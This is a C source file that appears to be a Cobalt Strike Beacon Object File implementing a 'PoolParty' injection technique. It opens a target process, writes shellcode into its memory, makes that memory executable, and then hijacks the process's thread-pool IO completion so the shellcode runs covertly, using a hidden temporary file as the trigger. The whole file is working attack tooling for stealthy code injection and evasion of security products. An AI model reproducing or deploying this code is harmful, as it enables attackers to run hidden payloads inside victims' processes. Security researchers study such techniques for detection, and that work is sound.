#include "PoolParty.h"

#define POOL_PARTY_POEM "Dive right in and make a splash,\n" \
                        "We're throwing a pool party in a flash!\n" \
                        "Bring your swimsuits and sunscreen galore,\n" \
                        "We'll turn up the heat and let the good times pour!\n"

void RemoteTpIoInsertionSetupExecution(HANDLE hTarget, LPVOID pShellcodeAddress) {
        _NtSetInformationFile ZwSetInformationFile = (_NtSetInformationFile)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationFile"));
        MSVCRT$srand((unsigned int)MSVCRT$time(NULL));

        wchar_t* POOL_PARTY_FILE_NAME = generateRandomLettersW(7);
        HANDLE hFile = KERNEL32$CreateFileW(
                POOL_PARTY_FILE_NAME,
                GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                NULL,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_HIDDEN | FILE_FLAG_OVERLAPPED | FILE_FLAG_DELETE_ON_CLOSE,
                NULL);

        PFULL_TP_IO pTpIo = (PFULL_TP_IO)KERNEL32$CreateThreadpoolIo(hFile, (PTP_WIN32_IO_CALLBACK)(pShellcodeAddress), NULL, NULL);

        /* Not sure why this field is not filled by CreateThreadpoolIo, need to analyze */
        pTpIo->CleanupGroupMember.Callback = pShellcodeAddress;

        ++pTpIo->PendingIrpCount;

        PFULL_TP_IO pRemoteTpIo = (PFULL_TP_IO)(KERNEL32$VirtualAllocEx(hTarget, NULL, sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
        KERNEL32$WriteProcessMemory(hTarget, pRemoteTpIo, pTpIo, sizeof(FULL_TP_IO), NULL);

        IO_STATUS_BLOCK IoStatusBlock = { 0 };
        FILE_COMPLETION_INFORMATION FileIoCopmletionInformation = { 0 };
        FileIoCopmletionInformation.Port = hIoCompletion;
        FileIoCopmletionInformation.Key = &pRemoteTpIo->Direct;
        ZwSetInformationFile(hFile, &IoStatusBlock, &FileIoCopmletionInformation, sizeof(FILE_COMPLETION_INFORMATION), r_FileReplaceCompletionInformation);

        const char* Buffer = POOL_PARTY_POEM;
        SIZE_T BufferLength = sizeof(Buffer);
        OVERLAPPED Overlapped = { 0 };
        KERNEL32$WriteFile(hFile, Buffer, BufferLength, NULL, &Overlapped);
        KERNEL32$CloseHandle(hFile);
}

void Inject4(DWORD dwTargetProcessId, CHAR* shellcode, SIZE_T shellcodeSize) {
        _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"));

        HANDLE hTarget = NULL;
        DWORD dwOldProtect = NULL;
        hTarget = KERNEL32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwTargetProcessId);

        if (hTarget) {
                HijackIoCompletionHandle(hTarget, IO_COMPLETION_ALL_ACCESS);
                
                PVOID pShellcodeAddress = KERNEL32$VirtualAllocEx(hTarget, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                NtWriteVirtualMemory(hTarget, pShellcodeAddress, shellcode, shellcodeSize, NULL);
                KERNEL32$VirtualProtectEx(hTarget, pShellcodeAddress, shellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect);
                
                RemoteTpIoInsertionSetupExecution(hTarget, pShellcodeAddress);
        } else {
                BeaconPrintf(CALLBACK_OUTPUT, "PID %d inaccessible", dwTargetProcessId);
        }

}